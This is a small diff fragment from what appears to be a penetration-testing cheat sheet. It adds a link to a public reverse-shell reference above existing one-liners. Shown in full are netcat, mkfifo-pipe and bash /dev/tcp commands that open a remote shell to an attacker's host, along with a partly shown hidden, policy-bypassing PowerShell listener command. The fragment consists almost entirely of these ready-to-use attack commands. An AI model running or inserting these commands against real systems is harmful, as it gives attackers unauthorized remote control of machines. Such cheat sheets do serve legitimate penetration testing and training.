@@ -1286,6 +1286,7 @@ $ powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.
 - Reverse Shells
 
 ```
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 $ nc -nv <IP address> <port> -e /bin/bash
 $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP address> <port> >/tmp/f
 $ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
